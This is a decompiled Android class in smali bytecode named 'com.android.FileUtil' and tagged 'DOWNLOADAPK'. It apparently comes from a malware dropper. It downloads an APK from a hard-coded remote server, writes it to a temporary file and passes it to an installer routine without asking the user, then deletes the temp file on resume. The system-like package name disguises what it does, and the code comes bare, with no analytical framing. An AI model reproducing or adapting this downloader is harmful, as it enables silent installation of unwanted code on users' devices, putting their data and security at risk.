.class public Lcom/android/FileUtil;
.super Landroid/app/Activity;
.source "FileUtil.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "DOWNLOADAPK"


# instance fields
.field private currentFilePath:Ljava/lang/String;

.field private currentTempFilePath:Ljava/lang/String;

.field private fileEx:Ljava/lang/String;

.field private fileNa:Ljava/lang/String;

.field private myTempFile:Ljava/io/File;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const-string v1, ""

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 16
    const-string v0, ""

    iput-object v1, p0, Lcom/android/FileUtil;->currentFilePath:Ljava/lang/String;

    .line 17
    const-string v0, ""

    iput-object v1, p0, Lcom/android/FileUtil;->currentTempFilePath:Ljava/lang/String;

    .line 18
    const-string v0, ""

    iput-object v1, p0, Lcom/android/FileUtil;->fileEx:Ljava/lang/String;

    .line 19
    const-string v0, ""

    iput-object v1, p0, Lcom/android/FileUtil;->fileNa:Ljava/lang/String;

    .line 20
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/android/FileUtil;->myTempFile:Ljava/io/File;

    .line 14
    return-void
.end method

.method private delFile(Ljava/lang/String;)V
    .locals 2
    .parameter "strFileName"

    .prologue
    .line 126
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 127
    .local v0, myFile:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 128
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 130
    :cond_0
    return-void
.end method

.method public static main([Ljava/lang/String;)V
    .locals 2
    .parameter "args"

    .prologue
    .line 25
    const-string v1, "http://xxxxxxxxx9:8618/client/android/a.apk"

    .line 26
    .local v1, strURL:Ljava/lang/String;
    new-instance v0, Lcom/android/FileUtil;

    invoke-direct {v0}, Lcom/android/FileUtil;-><init>()V

    .line 27
    .local v0, fileUtil:Lcom/android/FileUtil;
    invoke-virtual {v0, v1}, Lcom/android/FileUtil;->getFile(Ljava/lang/String;)I

    .line 29
    return-void
.end method


# virtual methods
.method public getDataSource(Ljava/lang/String;)V
    .locals 11
    .parameter "strPath"

    .prologue
    const-string v10, "info"

    .line 59
    invoke-static {p1}, Landroid/webkit/URLUtil;->isNetworkUrl(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 60
    const-string v7, "info"

    const-string v7, "ERROR URL"

    invoke-static {v10, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 87
    :goto_0
    return-void

    .line 63
    :cond_0
    :try_start_0
    new-instance v5, Ljava/net/URL;

    invoke-direct {v5, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 64
    .local v5, myURL:Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    .line 65
    .local v1, conn:Ljava/net/URLConnection;
    invoke-virtual {v1}, Ljava/net/URLConnection;->connect()V

    .line 66
    invoke-virtual {v1}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    .line 67
    .local v4, is:Ljava/io/InputStream;
    if-nez v4, :cond_1

    .line 68
    const-string v7, "info"

    const-string v8, "stream is null"

    invoke-static {v7, v8}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 70
    :cond_1
    iget-object v7, p0, Lcom/android/FileUtil;->fileNa:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "."

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v9, p0, Lcom/android/FileUtil;->fileEx:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v7

    iput-object v7, p0, Lcom/android/FileUtil;->myTempFile:Ljava/io/File;

    .line 71
    iget-object v7, p0, Lcom/android/FileUtil;->myTempFile:Ljava/io/File;

    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcom/android/FileUtil;->currentTempFilePath:Ljava/lang/String;

    .line 72
    new-instance v3, Ljava/io/FileOutputStream;

    iget-object v7, p0, Lcom/android/FileUtil;->myTempFile:Ljava/io/File;

    invoke-direct {v3, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 73
    .local v3, fos:Ljava/io/FileOutputStream;
    const/16 v7, 0x80

    new-array v0, v7, [B

    .line 75
    .local v0, buf:[B
    :goto_1
    invoke-virtual {v4, v0}, Ljava/io/InputStream;->read([B)I

    move-result v6

    .line 76
    .local v6, numread:I
    if-gtz v6, :cond_2

    .line 81
    iget-object v7, p0, Lcom/android/FileUtil;->currentTempFilePath:Ljava/lang/String;

    invoke-static {v7}, Lcom/android/APKInstaller;->install(Ljava/lang/String;)Ljava/lang/String;

    .line 82
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 83
    .end local v0           #buf:[B
    .end local v1           #conn:Ljava/net/URLConnection;
    .end local v3           #fos:Ljava/io/FileOutputStream;
    .end local v4           #is:Ljava/io/InputStream;
    .end local v5           #myURL:Ljava/net/URL;
    .end local v6           #numread:I
    :catch_0
    move-exception v7

    move-object v2, v7

    .line 84
    .local v2, ex:Ljava/lang/Exception;
    const-string v7, "info"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "error: "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v10, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 79
    .end local v2           #ex:Ljava/lang/Exception;
    .restart local v0       #buf:[B
    .restart local v1       #conn:Ljava/net/URLConnection;
    .restart local v3       #fos:Ljava/io/FileOutputStream;
    .restart local v4       #is:Ljava/io/InputStream;
    .restart local v5       #myURL:Ljava/net/URL;
    .restart local v6       #numread:I
    :cond_2
    const/4 v7, 0x0

    :try_start_1
    invoke-virtual {v3, v0, v7, v6}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method

.method public getFile(Ljava/lang/String;)I
    .locals 5
    .parameter "strPath"

    .prologue
    const-string v4, "."

    .line 33
    const-string v2, "."

    invoke-virtual {p1, v4}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0x1

    .line 34
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v3

    .line 33
    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    .line 34
    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    .line 33
    iput-object v2, p0, Lcom/android/FileUtil;->fileEx:Ljava/lang/String;

    .line 35
    const-string v2, "/"

    invoke-virtual {p1, v2}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0x1

    .line 36
    const-string v3, "."

    invoke-virtual {p1, v4}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    .line 35
    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/android/FileUtil;->fileNa:Ljava/lang/String;

    .line 38
    :try_start_0
    iget-object v2, p0, Lcom/android/FileUtil;->currentFilePath:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 39
    invoke-virtual {p0, p1}, Lcom/android/FileUtil;->getDataSource(Ljava/lang/String;)V

    .line 41
    :cond_0
    iput-object p1, p0, Lcom/android/FileUtil;->currentFilePath:Ljava/lang/String;

    .line 42
    new-instance v1, Lcom/android/FileUtil$1;

    invoke-direct {v1, p0, p1}, Lcom/android/FileUtil$1;-><init>(Lcom/android/FileUtil;Ljava/lang/String;)V

    .line 51
    .local v1, r:Ljava/lang/Runnable;
    new-instance v2, Ljava/lang/Thread;

    invoke-direct {v2, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    const/4 v2, 0x0

    .end local v1           #r:Ljava/lang/Runnable;
    :goto_0
    return v2

    .line 52
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 53
    .local v0, e:Ljava/lang/Exception;
    const/4 v2, 0x1

    goto :goto_0
.end method

.method public getMIMEType(Ljava/io/File;)Ljava/lang/String;
    .locals 6
    .parameter "f"

    .prologue
    const-string v5, "apk"

    .line 99
    const-string v2, ""

    .line 100
    .local v2, type:Ljava/lang/String;
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v1

    .line 102
    .local v1, fName:Ljava/lang/String;
    const-string v3, "."

    invoke-virtual {v1, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {v1, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    .line 103
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    .line 105
    .local v0, end:Ljava/lang/String;
    const-string v3, "m4a"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "mp3"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "mid"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    .line 106
    const-string v3, "xmf"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "ogg"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "wav"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 107
    :cond_0
    const-string v2, "audio"

    .line 118
    :goto_0
    const-string v3, "apk"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 120
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "/*"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 122
    :cond_1
    return-object v2

    .line 108
    :cond_2
    const-string v3, "3gp"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    const-string v3, "mp4"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 109
    :cond_3
    const-string v2, "video"

    goto :goto_0

    .line 110
    :cond_4
    const-string v3, "jpg"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    const-string v3, "gif"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    const-string v3, "png"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 111
    const-string v3, "jpeg"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_5

    const-string v3, "bmp"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_6

    .line 112
    :cond_5
    const-string v2, "image"

    goto :goto_0

    .line 113
    :cond_6
    const-string v3, "apk"

    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_7

    .line 114
    const-string v2, "application/vnd.android.package-archive"

    goto :goto_0

    .line 116
    :cond_7
    const-string v2, "*"

    goto :goto_0
.end method

.method protected onPause()V
    .locals 0

    .prologue
    .line 134
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 135
    return-void
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 139
    iget-object v0, p0, Lcom/android/FileUtil;->currentTempFilePath:Ljava/lang/String;

    invoke-direct {p0, v0}, Lcom/android/FileUtil;->delFile(Ljava/lang/String;)V

    .line 140
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 141
    return-void
.end method

.method public openFile(Ljava/io/File;)V
    .locals 3
    .parameter "f"

    .prologue
    .line 90
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 91
    .local v0, intent:Landroid/content/Intent;
    const/high16 v2, 0x1000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 92
    const-string v2, "android.intent.action.VIEW"

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 93
    invoke-virtual {p0, p1}, Lcom/android/FileUtil;->getMIMEType(Ljava/io/File;)Ljava/lang/String;

    move-result-object v1

    .line 94
    .local v1, type:Ljava/lang/String;
    invoke-static {p1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v0, v2, v1}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 95
    invoke-virtual {p0, v0}, Lcom/android/FileUtil;->startActivity(Landroid/content/Intent;)V

    .line 96
    return-void
.end method
